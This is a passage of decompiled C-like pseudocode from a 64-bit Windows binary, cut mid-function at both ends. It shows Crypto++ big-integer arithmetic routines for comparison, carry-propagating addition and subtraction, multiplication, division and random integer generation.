  unsigned __int64 v42; // rdx
  unsigned __int64 v43; // r8
  signed int v44; // eax
  int v45; // er15
  unsigned __int64 v46; // r8
  unsigned __int64 v47; // rdx
  unsigned int v48; // ecx
  signed __int64 v49; // rax
  bool v50; // zf
  int v51; // ebx
  unsigned __int64 v52; // rdx
  unsigned __int64 v53; // rcx
  unsigned int v54; // edx
  signed __int64 v55; // r8
  unsigned __int64 v56; // rcx
  signed __int64 result; // rax
  unsigned __int64 v58; // rdx
  unsigned __int64 v59; // rcx
  __int64 v60; // [rsp+70h] [rbp+8h]
  __int64 v61; // [rsp+78h] [rbp+10h]
  __int64 v62; // [rsp+80h] [rbp+18h]
  __int64 v63; // [rsp+98h] [rbp+30h]

  v62 = a3;
  v61 = a2;
  v60 = a1;
  v6 = a6;
  v7 = a4;
  v8 = a1;
  if ( a6 <= 0x10 )
  {
    v9 = *(_QWORD *)(a3 + 8 * a6 - 8);
    JUMPOUT(__CS__, qword_1400DA970[a6 >> 2]);
  }
  v10 = 0;
  v11 = a6 >> 1;
  v12 = a4 + 8 * (a6 >> 1);
  v13 = 1;
  v14 = a6 >> 1;
  v63 = a4 + 8 * (a6 >> 1);
  if ( v6 >> 1 )
  {
    v15 = a4 + 8 * v11;
    v16 = v12 - a4;
    while ( 1 )
    {
      v17 = *(_QWORD *)(v15 - 8);
      v18 = *(_QWORD *)(v16 + v15 - 8);
      v15 -= 8i64;
      --v14;
      if ( v17 > v18 )
        break;
      if ( v17 < v18 )
      {
        v19 = -1;
        goto LABEL_9;
      }
      if ( !v14 )
        goto LABEL_8;
    }
    v19 = 1;
  }
  else
  {
LABEL_8:
    v19 = 0;
  }
LABEL_9:
  v20 = v6 >> 1;
  if ( v19 > 0 )
    v20 = 0i64;
  sub_140062F60(v6 >> 1, v8, v7 + 8 * v20, v7 + 8 * (v11 ^ v20));
  v21 = v6 >> 1;
  if ( v11 )
  {
    v22 = a5 + 8 * v11;
    while ( 1 )
    {
      v23 = *(_QWORD *)(v22 - 8);
      v24 = *(_QWORD *)(8 * v11 + v22 - 8);
      v22 -= 8i64;
      --v21;
      if ( v23 > v24 )
        break;
      if ( v23 < v24 )
      {
        v25 = -1;
        goto LABEL_17;
      }
      if ( !v21 )
        goto LABEL_16;
    }
    v25 = 1;
  }
  else
  {
LABEL_16:
    v25 = 0;
  }
LABEL_17:
  v26 = v6 >> 1;
  v27 = (unsigned __int64 *)(v8 + 8 * v11);
  if ( v25 > 0 )
    v26 = 0i64;
  sub_140062F60(v6 >> 1, (__int64)v27, a5 + 8 * v26, a5 + 8 * (v11 ^ v26));
  v28 = (unsigned __int64 *)(v61 + 8 * v6);
  sub_14004ADC0(v61, (__int64)v28, v60, (__int64)v27, v11);
  sub_14004ADC0(v60, (__int64)v28, v63, a5 + 8 * v11, v11);
  v29 = sub_140062F60(v11, (__int64)v28, v62 + 8 * v11, v62);
  if ( v20 == v26 )
  {
    v30 = sub_140062F10(v11, (__int64)v28, (__int64)v28, v61);
    v31 = v11;
    v32 = v29 - v30;
    if ( v11 )
    {
      v33 = v27;
      while ( 1 )
      {
        v34 = *(unsigned __int64 *)((char *)v33 + (_QWORD)v28 - v60 - 8);
        v35 = *(v33 - 1);
        --v33;
        --v31;
        if ( v34 > v35 )
          break;
        if ( v34 < v35 )
        {
          v36 = -1;
          goto LABEL_26;
        }
        if ( !v31 )
          goto LABEL_25;
      }
      v36 = 1;
    }
    else
    {
LABEL_25:
      v36 = 0;
    }
LABEL_26:
    v37 = v36 == -1;
    v38 = v37 - (unsigned __int64)sub_140062F60(v11, (__int64)v28, (__int64)v28, v61 + 8 * v11);
  }
  else
  {
    v39 = sub_140062F60(v11, (__int64)v28, (__int64)v28, v61);
    v40 = v11;
    v32 = v39 + v29;
    if ( v11 )
    {
      v41 = v27;
      while ( 1 )
      {
        v42 = *(unsigned __int64 *)((char *)v41 + (_QWORD)v28 - v60 - 8);
        v43 = *(v41 - 1);
        --v41;
        --v40;
        if ( v42 > v43 )
          break;
        if ( v42 < v43 )
        {
          v44 = -1;
          goto LABEL_39;
        }
        if ( !v40 )
          goto LABEL_38;
      }
      v44 = 1;
    }
    else
    {
LABEL_38:
      v44 = 0;
    }
LABEL_39:
    v37 = v44 == -1;
    v38 = (unsigned __int64)sub_140062F10(v11, (__int64)v28, (__int64)v28, v61 + 8 * v11) + v37;
  }
  v45 = v37 + v32;
  if ( v45 < 0 )
  {
    v52 = *v28;
    v53 = *v28 - -v45;
    *v28 = v53;
    if ( v53 > v52 )
    {
      v54 = 1;
      if ( v11 <= 1 )
      {
LABEL_55:
        v10 = 1;
      }
      else
      {
        v55 = 1i64;
        while ( 1 )
        {
          v56 = v28[v55];
          v28[v55] = v56 - 1;
          if ( v56 )
            break;
          v55 = ++v54;
          if ( v54 >= v11 )
            goto LABEL_55;
        }
      }
    }
    v51 = v38 - v10;
  }
  else
  {
    v46 = *v28;
    v47 = *v28 + v45;
    *v28 = v47;
    if ( v47 < v46 )
    {
      v48 = 1;
      if ( v11 <= 1 )
      {
LABEL_46:
        v10 = 1;
      }
      else
      {
        v49 = 1i64;
        while ( 1 )
        {
          v50 = v28[v49]++ == -1i64;
          if ( !v50 )
            break;
          v49 = ++v48;
          if ( v48 >= v11 )
            goto LABEL_46;
        }
      }
    }
    v51 = v10 + v38;
  }
  result = sub_140062F10(v11, v60, (__int64)v28, (__int64)v27);
  v58 = *v27;
  v59 = *v27 + (signed int)result + v51;
  *v27 = v59;
  if ( v59 < v58 && v11 > 1 )
  {
    result = 1i64;
    do
    {
      v50 = v27[result]++ == -1i64;
      if ( !v50 )
        break;
      result = ++v13;
    }
    while ( v13 < v11 );
  }
  return result;
}
// 1400DA970: using guessed type __int64 qword_1400DA970[];

//----- (0000000140049D90) ----------------------------------------------------
void __fastcall sub_140049D90(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  void *v3; // rdx
  __int64 v4; // rbx
  __int64 v5; // rcx
  void *v6; // rax

  v2 = a2;
  v3 = *(void **)(a1 + 16);
  v4 = a1;
  v5 = *(_QWORD *)(a1 + 8);
  if ( v5 == v2 )
  {
    *(_QWORD *)(v4 + 16) = v3;
    *(_QWORD *)(v4 + 8) = v2;
  }
  else
  {
    memset(v3, 0, 8 * v5);
    free(v3);
    sub_140025670(v2);
    if ( v2 )
    {
      v6 = sub_14003A000(8 * v2);
      *(_QWORD *)(v4 + 8) = v2;
      *(_QWORD *)(v4 + 16) = v6;
    }
    else
    {
      *(_QWORD *)(v4 + 8) = 0i64;
      *(_QWORD *)(v4 + 16) = 0i64;
    }
  }
}

//----- (0000000140049E20) ----------------------------------------------------
_BOOL8 __fastcall sub_140049E20(__int64 a1)
{
  return *(_BYTE *)(a1 + 32) == 0;
}

//----- (0000000140049E30) ----------------------------------------------------
__int64 sub_140049E30()
{
  char v1; // [rsp+8h] [rbp+8h]

  return sub_14004B3C0(&v1);
}
// 14004B3C0: using guessed type __int64 __fastcall sub_14004B3C0(_QWORD);

//----- (0000000140049E40) ----------------------------------------------------
signed __int64 sub_140049E40()
{
  return 1i64;
}

//----- (0000000140049F00) ----------------------------------------------------
signed __int64 __fastcall sub_140049F00(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v3; // rax
  __int64 v4; // r9
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdi
  __int64 v8; // r8
  __int64 v9; // rsi
  __int64 v10; // rdx
  signed __int64 result; // rax
  BOOL v12; // eax
  __int64 v13; // rcx
  __int64 v14; // r9
  const void *v15; // r8
  _BOOL8 v16; // rbp
  void *v17; // rcx
  __int64 v18; // r10
  __int64 v19; // r8
  unsigned __int64 v20; // rdx
  _QWORD *v21; // r9
  unsigned int v22; // ecx
  unsigned __int64 v23; // r8
  bool v24; // zf
  BOOL v25; // eax
  __int64 v26; // rcx
  __int64 v27; // r9
  const void *v28; // r8
  _BOOL8 v29; // rbp
  void *v30; // rcx
  __int64 v31; // r10
  __int64 v32; // r8
  unsigned __int64 v33; // rdx
  _QWORD *v34; // r9
  unsigned int v35; // ecx
  unsigned __int64 v36; // r8

  v3 = *(_QWORD *)(a3 + 16);
  v4 = *(_QWORD *)(a3 + 24);
  v5 = a1;
  v6 = *(_QWORD *)(a2 + 16);
  v7 = a3;
  v8 = *(_QWORD *)(a2 + 24);
  v9 = a2;
  v10 = *(_QWORD *)(v5 + 24);
  if ( v6 == v3 )
  {
    result = sub_140062F10(v6, v10, v8, v4);
    if ( !(_DWORD)result )
      goto LABEL_21;
    goto LABEL_20;
  }
  if ( v6 > v3 )
  {
    v12 = sub_140062F10(v3, v10, v8, v4);
    v13 = *(_QWORD *)(v7 + 16);
    v14 = *(_QWORD *)(v9 + 16) - v13;
    v15 = (const void *)(8 * v13 + *(_QWORD *)(v9 + 24));
    v16 = v12;
    v17 = (void *)(8 * v13 + *(_QWORD *)(v5 + 24));
    if ( v17 != v15 )
      memcpy_s(v17, 8 * v14, v15, 8 * v14);
    v18 = *(_QWORD *)(v7 + 16);
    result = *(_QWORD *)(v5 + 24);
    v19 = *(_QWORD *)(v9 + 16);
    v20 = *(_QWORD *)(result + 8 * v18);
    v21 = (_QWORD *)(result + 8 * v18);
    *v21 = v20 + v16;
    if ( v20 + v16 >= v20 )
      goto LABEL_21;
    v22 = 1;
    v23 = v19 - v18;
    if ( v23 > 1 )
    {
      result = 1i64;
      do
      {
        v24 = v21[result]++ == -1i64;
        if ( !v24 )
          goto LABEL_21;
        result = ++v22;
      }
      while ( v22 < v23 );
    }
LABEL_20:
    sub_1400458E0(v5 + 8, 2i64 * *(_QWORD *)(v5 + 16));
    result = *(_QWORD *)(v5 + 24);
    *(_QWORD *)(result + 8i64 * (*(_QWORD *)(v5 + 16) >> 1)) = 1i64;
    goto LABEL_21;
  }
  v25 = sub_140062F10(v6, v10, v8, v4);
  v26 = *(_QWORD *)(v9 + 16);
  v27 = *(_QWORD *)(v7 + 16) - v26;
  v28 = (const void *)(8 * v26 + *(_QWORD *)(v7 + 24));
  v29 = v25;
  v30 = (void *)(8 * v26 + *(_QWORD *)(v5 + 24));
  if ( v30 != v28 )
    memcpy_s(v30, 8 * v27, v28, 8 * v27);
  v31 = *(_QWORD *)(v9 + 16);
  result = *(_QWORD *)(v5 + 24);
  v32 = *(_QWORD *)(v7 + 16);
  v33 = *(_QWORD *)(result + 8 * v31);
  v34 = (_QWORD *)(result + 8 * v31);
  *v34 = v33 + v29;
  if ( v33 + v29 >= v33 )
    goto LABEL_21;
  v35 = 1;
  v36 = v32 - v31;
  if ( v36 <= 1 )
    goto LABEL_20;
  result = 1i64;
  while ( 1 )
  {
    v24 = v34[result]++ == -1i64;
    if ( !v24 )
      break;
    result = ++v35;
    if ( v35 >= v36 )
      goto LABEL_20;
  }
LABEL_21:
  *(_DWORD *)(v5 + 32) = 0;
  return result;
}

//----- (000000014004A0B0) ----------------------------------------------------
signed __int64 __fastcall sub_14004A0B0(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  __int64 v3; // r9
  _QWORD *v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rdx
  _QWORD *v7; // rax
  __int64 v8; // rcx
  signed __int64 v9; // rax
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  signed __int64 result; // rax

  v2 = *(_QWORD *)(a1 + 16);
  v3 = *(_QWORD *)(a1 + 24);
  if ( v2 )
  {
    v4 = (_QWORD *)(v3 + 8 * (v2 - 1));
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v2;
    }
    while ( v2 );
  }
  v5 = *(_QWORD *)(a2 + 16);
  v6 = *(_QWORD *)(a2 + 24);
  if ( v5 )
  {
    v7 = (_QWORD *)(v6 - 8 + 8 * v5);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v5;
    }
    while ( v5 );
  }
  if ( (_DWORD)v2 == (_DWORD)v5 )
  {
    v8 = (unsigned int)v2;
    if ( (_DWORD)v2 )
    {
      v9 = v6 + 8i64 * (unsigned int)v2;
      v10 = v3 - v6;
      while ( 1 )
      {
        v11 = *(_QWORD *)(v10 + v9 - 8);
        v12 = *(_QWORD *)(v9 - 8);
        v9 -= 8i64;
        --v8;
        if ( v11 > v12 )
          break;
        if ( v11 < v12 )
          return 0xFFFFFFFFi64;
        if ( !v8 )
          goto LABEL_15;
      }
      result = 1i64;
    }
    else
    {
LABEL_15:
      result = 0i64;
    }
  }
  else
  {
    result = 0xFFFFFFFFi64;
    if ( (unsigned int)v2 > (unsigned int)v5 )
      result = 1i64;
  }
  return result;
}

//----- (000000014004A160) ----------------------------------------------------
void __fastcall sub_14004A160(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r12
  __int64 v5; // r13
  __int64 v6; // r15
  __int64 v7; // rbp
  __int64 v8; // rdx
  _QWORD *v9; // rax
  __int64 v10; // rax
  _QWORD *v11; // rcx
  __int64 v12; // rax
  unsigned int v13; // er14
  unsigned int v14; // edi
  signed __int64 v15; // rax
  void *v16; // rcx
  _QWORD *v17; // rbx
  signed __int64 v18; // rax
  void *v19; // rcx
  unsigned __int64 v20; // rcx
  __int64 v21; // rsi
  char v22; // [rsp+40h] [rbp-C8h]
  unsigned __int64 v23; // [rsp+48h] [rbp-C0h]
  __int64 v24; // [rsp+50h] [rbp-B8h]
  __int64 v25; // [rsp+60h] [rbp-A8h]
  _QWORD *v26; // [rsp+68h] [rbp-A0h]
  char v27; // [rsp+70h] [rbp-98h]

  v24 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = *(_QWORD *)(a3 + 16);
  if ( v8 )
  {
    v9 = (_QWORD *)(*(_QWORD *)(a3 + 24) + 8 * v8 - 8);
    do
    {
      if ( *v9 )
        break;
      --v9;
      --v8;
    }
    while ( v8 );
  }
  v10 = *(_QWORD *)(a4 + 16);
  if ( v10 )
  {
    v11 = (_QWORD *)(*(_QWORD *)(a4 + 24) + 8 * v10 - 8);
    do
    {
      if ( *v11 )
        break;
      --v11;
      --v10;
    }
    while ( v10 );
  }
  if ( !(_DWORD)v10 )
  {
    sub_14003C450(&v27);
    CxxThrowException(&v27, &_TI3_AVcls_099_cls_097_CryptoPP__);
  }
  if ( (unsigned int)v8 >= (unsigned int)v10 )
  {
    v13 = v8 + (v8 & 1);
    v14 = v10 + (v10 & 1);
    v23 = v14;
    v15 = sub_14004B580(v14);
    sub_140049D90(v7 + 8, v15);
    v16 = *(void **)(v7 + 24);
    if ( v16 )
      memset(v16, 0, 8i64 * *(_QWORD *)(v7 + 16));
    v17 = 0i64;
    *(_DWORD *)(v7 + 32) = 0;
    v18 = sub_14004B580(v13 - v14 + 2);
    sub_140049D90(v6 + 8, v18);
    v19 = *(void **)(v6 + 24);
    if ( v19 )
      memset(v19, 0, 8i64 * *(_QWORD *)(v6 + 16));
    *(_DWORD *)(v6 + 32) = 0;
    v20 = v13 + 2 * (v14 + 2) + v14 + 2;
    v21 = (unsigned int)v20;
    v25 = (unsigned int)v20;
    sub_140025670(v20);
    if ( v21 )
      v17 = sub_14003A000(8 * v21);
    v26 = v17;
    sub_140046010(
      *(char **)(v7 + 24),
      *(_QWORD *)(v6 + 24),
      v17,
      *(_QWORD **)(v5 + 24),
      v13,
      *(_QWORD **)(v4 + 24),
      v23);
    memset(v17, 0, 8 * v21);
    free(v17);
  }
  else
  {
    sub_14003C670(v7, a3);
    *(_DWORD *)(v7 + 32) = 0;
    v12 = sub_14004B4E0(&v22);
    sub_14003C670(v6, v12);
  }
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4228: using guessed type int _TI3_AVcls_099_cls_097_CryptoPP__;

//----- (000000014004A350) ----------------------------------------------------
void __fastcall sub_14004A350(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r14
  __int64 v4; // rbp
  __int64 v5; // r15
  __int64 v6; // rax
  _QWORD *v7; // rdi
  signed __int64 v8; // r13
  __int64 v9; // rcx
  _QWORD *v10; // rdx
  signed __int64 v11; // r12
  unsigned __int64 v12; // rbx
  signed __int64 v13; // rax
  void *v14; // rcx
  void *v15; // rsi

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = *(_QWORD *)(a2 + 16);
  if ( v6 )
  {
    v7 = (_QWORD *)(*(_QWORD *)(a2 + 24) + 8 * v6 - 8);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  v8 = sub_14004B580((unsigned int)v6);
  v9 = *(_QWORD *)(v3 + 16);
  if ( v9 )
  {
    v10 = (_QWORD *)(*(_QWORD *)(v3 + 24) + 8 * v9 - 8);
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v9;
    }
    while ( v9 );
  }
  v11 = sub_14004B580((unsigned int)v9);
  v12 = v11 + v8;
  v13 = sub_14004B580(v11 + v8);
  sub_140049D90(v5 + 8, v13);
  v14 = *(void **)(v5 + 24);
  if ( v14 )
    memset(v14, 0, 8i64 * *(_QWORD *)(v5 + 16));
  v15 = 0i64;
  *(_DWORD *)(v5 + 32) = 0;
  sub_140025670(v12);
  if ( v12 )
    v15 = sub_14003A000(8 * v12);
  sub_14003E520(*(unsigned __int64 **)(v5 + 24), (__int64)v15, *(_QWORD *)(v4 + 24), v8, *(_QWORD *)(v3 + 24), v11);
  memset(v15, 0, 8 * v12);
  free(v15);
}

//----- (000000014004A490) ----------------------------------------------------
unsigned __int64 __fastcall sub_14004A490(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  __int64 v4; // r11
  __int64 v5; // r15
  __int64 v6; // r14
  __int64 v7; // rbp
  _QWORD *v8; // r9
  __int64 v9; // r10
  __int64 v10; // rdi
  __int64 v11; // rax
  _QWORD *v12; // rcx
  __int64 v13; // rsi
  __int64 v14; // rcx
  signed __int64 v15; // rax
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // r8
  unsigned __int64 result; // rax
  __int64 v19; // rdx
  __int64 v20; // rdi
  __int64 v21; // r15
  const void *v22; // r8
  void *v23; // rcx
  __int64 v24; // rax
  unsigned __int64 v25; // rcx
  unsigned __int64 *v26; // r8
  unsigned int v27; // edx
  unsigned __int64 *v28; // r8
  unsigned __int64 v29; // rcx
  __int64 v30; // rsi
  __int64 v31; // r14
  const void *v32; // r8
  void *v33; // rcx
  __int64 v34; // rax
  unsigned __int64 v35; // rcx
  unsigned __int64 *v36; // r8
  unsigned int v37; // er9
  unsigned __int64 *v38; // r8
  unsigned __int64 v39; // rcx

  v3 = *(_QWORD *)(a2 + 16);
  v4 = *(_QWORD *)(a2 + 24);
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( v3 )
  {
    v8 = (_QWORD *)(v4 + 8 * (v3 - 1));
    do
    {
      if ( *v8 )
        break;
      --v8;
      --v3;
    }
    while ( v3 );
  }
  v9 = *(_QWORD *)(a3 + 24);
  v10 = (unsigned int)v3 + (v3 & 1);
  v11 = *(_QWORD *)(a3 + 16);
  if ( v11 )
  {
    v12 = (_QWORD *)(v9 + 8 * (v11 - 1));
    do
    {
      if ( *v12 )
        break;
      --v12;
      --v11;
    }
    while ( v11 );
  }
  v13 = (unsigned int)v11 + (v11 & 1);
  if ( (_DWORD)v10 == (_DWORD)v13 )
  {
    v14 = (unsigned int)v10;
    if ( (_DWORD)v10 )
    {
      v15 = v9 + 8 * v10;
      do
      {
        v16 = *(_QWORD *)(v4 - v9 + v15 - 8);
        v17 = *(_QWORD *)(v15 - 8);
        v15 -= 8i64;
        --v14;
        if ( v16 > v17 )
          break;
        if ( v16 < v17 )
        {
          result = sub_140062F60((unsigned int)v10, *(_QWORD *)(v7 + 24), v9, v4);
          goto LABEL_33;
        }
      }
      while ( v14 );
    }
    result = sub_140062F60((unsigned int)v10, *(_QWORD *)(v7 + 24), v4, v9);
    *(_DWORD *)(v7 + 32) = 0;
  }
  else
  {
    v19 = *(_QWORD *)(v7 + 24);
    if ( (unsigned int)v10 <= (unsigned int)v13 )
    {
      v30 = (unsigned int)(v13 - v10);
      v31 = (signed int)sub_140062F60((unsigned int)v10, v19, *(_QWORD *)(a3 + 24), v4);
      v32 = (const void *)(*(_QWORD *)(v5 + 24) + 8i64 * (unsigned int)v10);
      v33 = (void *)(*(_QWORD *)(v7 + 24) + 8i64 * (unsigned int)v10);
      if ( v33 != v32 )
        memcpy_s(v33, 8 * v30, v32, 8 * v30);
      v34 = *(_QWORD *)(v7 + 24);
      v35 = *(_QWORD *)(v34 + 8i64 * (unsigned int)v10);
      v36 = (unsigned __int64 *)(v34 + 8i64 * (unsigned int)v10);
      result = *(_QWORD *)(v34 + 8i64 * (unsigned int)v10) - v31;
      *v36 = result;
      if ( result > v35 )
      {
        v37 = 1;
        if ( (unsigned int)v30 > 1 )
        {
          v38 = v36 + 1;
          do
          {
            v39 = *v38;
            result = *v38 - 1;
            *v38 = result;
            if ( v39 )
              break;
            ++v37;
            ++v38;
          }
          while ( v37 < (unsigned int)v30 );
        }
      }
LABEL_33:
      *(_DWORD *)(v7 + 32) = 1;
    }
    else
    {
      v20 = (unsigned int)(v10 - v13);
      v21 = (signed int)sub_140062F60((unsigned int)v13, v19, v4, *(_QWORD *)(a3 + 24));
      v22 = (const void *)(*(_QWORD *)(v6 + 24) + 8 * v13);
      v23 = (void *)(*(_QWORD *)(v7 + 24) + 8 * v13);
      if ( v23 != v22 )
        memcpy_s(v23, 8 * v20, v22, 8 * v20);
      v24 = *(_QWORD *)(v7 + 24);
      v25 = *(_QWORD *)(v24 + 8 * v13);
      v26 = (unsigned __int64 *)(v24 + 8 * v13);
      result = *(_QWORD *)(v24 + 8 * v13) - v21;
      *v26 = result;
      if ( result > v25 )
      {
        v27 = 1;
        if ( (unsigned int)v20 > 1 )
        {
          v28 = v26 + 1;
          do
          {
            v29 = *v28;
            result = *v28 - 1;
            *v28 = result;
            if ( v29 )
              break;
            ++v27;
            ++v28;
          }
          while ( v27 < (unsigned int)v20 );
        }
      }
      *(_DWORD *)(v7 + 32) = 0;
    }
  }
  return result;
}

//----- (000000014004A760) ----------------------------------------------------
void __noreturn sub_14004A760()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140048040(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4290: using guessed type int _TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__;

//----- (000000014004A820) ----------------------------------------------------
void __fastcall sub_14004A820(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rbp
  __int64 v7; // rbx
  int v8; // eax
  __int64 v9; // rax
  _QWORD *v10; // rcx
  unsigned int v11; // edi
  __int64 v12; // r8
  unsigned __int64 v13; // r9
  unsigned int v14; // edx
  unsigned int v15; // er8
  unsigned __int64 v16; // rdi
  void *v17; // rdx
  char v18; // [rsp+20h] [rbp-C8h]
  __int64 v19; // [rsp+30h] [rbp-B8h]
  void *Memory; // [rsp+38h] [rbp-B0h]
  __int64 v21; // [rsp+48h] [rbp-A0h]
  char v22; // [rsp+50h] [rbp-98h]
  __int64 v23; // [rsp+60h] [rbp-88h]
  __int64 v24; // [rsp+68h] [rbp-80h]
  __int64 (__fastcall **v25)(void *); // [rsp+70h] [rbp-78h]
  int v26; // [rsp+88h] [rbp-60h]
  char Dst; // [rsp+90h] [rbp-58h]
  __int64 v28; // [rsp+A0h] [rbp-48h]
  __int64 v29; // [rsp+A8h] [rbp-40h]

  v21 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( *(_DWORD *)(a3 + 32) == 1 )
  {
    if ( *(_DWORD *)(a4 + 32) != 1 )
      goto LABEL_9;
    v8 = -(signed int)sub_14004A0B0(a3, a4);
  }
  else
  {
    if ( *(_DWORD *)(a4 + 32) == 1 )
    {
LABEL_7:
      v24 = 15i64;
      v23 = 0i64;
      v22 = 0;
      sub_140004F20(&v22, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v25);
      v25 = &off_1400A8798;
      v26 = 1;
      v29 = 15i64;
      v28 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v22, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v25 = &off_1400A8798;
      CxxThrowException(&v25, &_TI3_AVcls_001_CryptoPP__);
    }
    v8 = sub_14004A0B0(a3, a4);
  }
  if ( v8 > 0 )
    goto LABEL_7;
LABEL_9:
  sub_140024710((__int64)&v18, v4, v5);
  v9 = v19;
  if ( v19 )
  {
    v10 = (char *)Memory + 8 * (v19 - 1);
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v9;
    }
    while ( v9 );
  }
  v11 = 0;
  if ( (_DWORD)v9 )
  {
    v12 = (unsigned int)(v9 - 1);
    v13 = *((_QWORD *)Memory + v12);
    if ( v13 )
    {
      v14 = 64;
      do
      {
        if ( v13 >> ((v14 + v11) >> 1) )
          v11 = (v14 + v11) >> 1;
        else
          v14 = (v14 + v11) >> 1;
      }
      while ( v14 - v11 > 1 );
      v11 = v14;
    }
    v15 = v11 + ((_DWORD)v12 << 6);
  }
  else
  {
    v15 = 0;
  }
  v16 = v15;
  do
    sub_14004AA20(v7, v6, v16);
  while ( sub_14003D2B0(v7, (__int64)&v18) );
  sub_14003D540(v7, v5);
  v17 = Memory;
  memset(Memory, 0, 8 * v19);
  free(v17);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (000000014004AA20) ----------------------------------------------------
void __fastcall sub_14004AA20(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  char v3; // bp
  __int64 v4; // r14
  __int64 v5; // r15
  signed __int64 v6; // rbx
  char *v7; // rsi
  unsigned __int64 v8; // rbp
  char v9; // al
  char v10; // [rsp+40h] [rbp-78h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (a3 >> 3) + 1;
  sub_1400255A0(v6);
  if ( v6 )
    v7 = (char *)sub_14003A000(v6);
  else
    v7 = 0i64;
  (*(void (__fastcall **)(__int64, char *, signed __int64))(*(_QWORD *)v4 + 64i64))(v4, v7, v6);
  if ( v6 )
  {
    v8 = v3 & 7;
    if ( v8 >= 8 )
      v9 = *v7;
    else
      v9 = *v7 & ((1 << v8) - 1);
    *v7 = v9;
  }
  sub_14003BC90((__int64)&v10, (__int64)v7, v6);
  sub_140045CD0(v5, (__int64)&v10, v6, 0);
  memset(v7, 0, v6);
  free(v7);
}

//----- (000000014004AB20) ----------------------------------------------------
__int64 __fastcall sub_14004AB20(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5, __int64 a6, __int64 a7)
{
  __int64 v7; // rbx
  __int64 v8; // rdi
  __int64 v9; // rsi
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // ST20_8
  __int64 v14; // rax
  __int64 v15; // ST20_8
  __int64 v16; // rax
  unsigned __int8 v17; // bl
  char v19; // [rsp+28h] [rbp-20h]
  void (__fastcall ***v20)(_QWORD, signed __int64); // [rsp+30h] [rbp-18h]

  v7 = a4;
  v8 = a2;
  v9 = a1;
  v10 = sub_14003B100((__int64)&v19, (__int64)&unk_1400A9E68, a3, 1u);
  v11 = sub_14003A970(v10, &unk_1400A9E6C, v7, *(unsigned __int8 *)(v10 + 16), -2i64, *(_QWORD *)&v19);
  v12 = sub_14003AA40(v11, (__int64)"RandomNumberType", &a5, *(_BYTE *)(v11 + 16));
  v14 = sub_14003A970(v12, "EquivalentTo", a6, *(unsigned __int8 *)(v12 + 16), v13, *(_QWORD *)&v19);
  v16 = sub_14003A970(v14, "Mod", a7, *(unsigned __int8 *)(v14 + 16), v15, *(_QWORD *)&v19);
  v17 = sub_140047310(v9, v8, v16);
  if ( v20 )
    (**v20)(v20, 1i64);
  return v17;
}
// 14003A970: using guessed type __int64 __fastcall sub_14003A970(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014004AC00) ----------------------------------------------------
__int64 __fastcall sub_14004AC00(__int64 a1, __m128i *a2, _QWORD *a3, unsigned __int64 a4)
{
  __m128i *v4; // rsi
  __int64 v5; // rbx
  unsigned int v6; // er9
  signed __int64 v7; // rdi
  unsigned __int64 v8; // rcx
  unsigned int v9; // edi
  unsigned int v10; // er8
  __int64 *v11; // rdx
  __int64 v12; // rcx
  unsigned __int64 v13; // rcx
  __int64 *v14; // rax
